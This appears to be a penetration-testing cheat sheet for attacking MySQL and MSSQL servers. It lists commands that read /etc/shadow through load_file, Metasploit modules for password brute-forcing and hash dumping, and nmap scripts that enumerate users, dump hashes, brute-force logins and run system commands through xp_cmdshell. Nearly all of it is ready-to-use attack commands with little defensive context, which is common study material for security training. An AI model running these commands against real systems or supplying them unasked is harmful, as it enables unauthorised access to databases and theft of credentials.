MySQL is a database service that usually runs in port 3306.
To connect to MySQL, use the following command
-mysql -h <target_ip> -u <user>
showing databses available
-show databases;
To select a database
-use <databse>;
To find total values from a table
-select count(*) from <table>;


After finding a sensitive file, we can load it with the mysql command. For example. lets pretend we found that the etc/shadow file is sensitive. 
First, we connect
-mysql -h <target_ip> -u <user>
Then, we load the file
-select load_file("/etc/shadow");

METASPLOIT

Dump the schema of all databases from the server using suitable metasploit module
-use auxiliary/scanner/mysql/mysql_schemadump
Finding writeable directories
-use auxiliary/scanner/mysql/mysql_writable_dirs
-set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
To set the password empty
-set PASSWORD ""
Finding sensitive files with METASPLOIT
-use auxiliary/scanner/mysql/mysql_file_enum
-set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

Cracking passwords with METASPLOIT
-use auxiliary/scanner/mysql/mysql_login
- set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-set VERBOSE false
-set STOP_ON_SUCCESS true

Finding all users and their password hashes
-use auxiliary/scanner/mysql/mysql_hashdump


NMAP

Checking if anonymous login is available
-nmap --script=mysql-empty-password -p 3306 <target_ip>
Check whether “InteractiveClient” capability is supported on the MySQL server.
- nmap --script=mysql-info -p 3306 <target_ip>

Enumerate the users present on MySQL database server using mysql-users nmap script.
-nmap --script=mysql-users --script-args="mysqluser='<user>',mysqlpass=''" -p 3306 <target_ip>
List all databases stored on the MySQL Server using nmap script.
-nmap --script=mysql-databases --script-args="mysqluser='<user>',mysqlpass=<password>" -p 3306 <target_ip>

Find the data directory used by mysql server using nmap script.
-nmap --script=mysql-variables --script-args="mysqluser='<user>',mysqlpass=<pass>" -p 3306 <target_ip>
Check whether File Privileges can be granted to non admin users using mysql-audit nmap script.
- nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.71.145.3

Dump all user hashes using nmap script (this works for mysql specifically)
  -nmap --script mysql-dump-hashes --script-args="username='<user>',password=<pass>" -p <port> <target_ip>
If the service being used is ms-sql, use this instead:
-nmap -p <port> --script ms-sql-dump-hashes --script-args mssql.username=<username>,mssql.password=<password> <target_ip>


SQL Injection with NMAP
-nmap --script=mysql-query --script-args="query=<enter_query>',username='root',password=''" -p 3306 <target_ip>

Finding the server info 
-nmap --script ms-sql-info -p <port_number> <ip_target>

Running ms-sql-ntlm-info script to disclose more information
-nmap -p <port> --script ms-sql-ntlm-info --script-args mssql.instance-port=<port> <target_ip>

Identifying valid MSSQL users and their passwords using provided username and password list.
- nmap -p <port> --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <target_ip>

Running ms-sql-empty-password nmap script to check if sa user is enabled without any password.
- nmap -p <port> --script ms-sql-empty-password <target>

Extracting sysusers from MSSQL and storing the output in a file i.e output.txt
- nmap -p 1433 --script ms-sql-query --script-args mssql.username=<user>,mssql.password=<password>,ms-sql-query.query="SELECT * FROM master..syslogins" <target_ip> -oN output.txt

Execute a command using xp_cmdshell using Nmap script.
-  nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" <target_ip>
